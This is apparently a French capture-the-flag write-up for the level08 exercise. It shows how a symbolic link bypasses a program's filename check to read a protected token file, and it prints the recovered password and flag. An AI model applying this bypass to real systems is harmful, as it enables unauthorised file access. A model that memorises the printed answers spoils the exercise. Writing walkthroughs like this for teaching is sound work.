# level08

## Contexte

On trouve les fichiers suivants dans le home de `level08` :

```text
level08
token
```

Le fichier `token` appartient à `flag08` et n'est pas lisible par `level08`.

## Recherche

On lance le programme :

```bash
./level08 token
```

Le programme refuse de lire le fichier.

En observant son fonctionnement, on remarque qu'il vérifie simplement si le nom du fichier contient le mot `token`.

## Vulnérabilité

Le programme bloque uniquement les fichiers dont le **nom** contient `token`.

En revanche, il ne vérifie pas le fichier réellement ouvert après la résolution d'un lien symbolique.

Il est donc possible de contourner cette protection avec un **lien symbolique**.

## Exploitation

On crée un lien symbolique vers le fichier `token` avec un autre nom :

```bash
ln -s ~/token /tmp/access
```

On lance ensuite le programme sur ce lien :

```bash
./level08 /tmp/access
```

Le programme affiche le contenu du fichier :

```text
quif5eloekouj29ke0vouxean
```

On utilise ensuite ce mot de passe pour se connecter à `flag08` puis lancer `getflag` :

```text
25749xKZ8L7DkSCwJkT9dyv6f
```

## Ressources

- Liens symboliques (`ln -s`)
- Vérification de chemin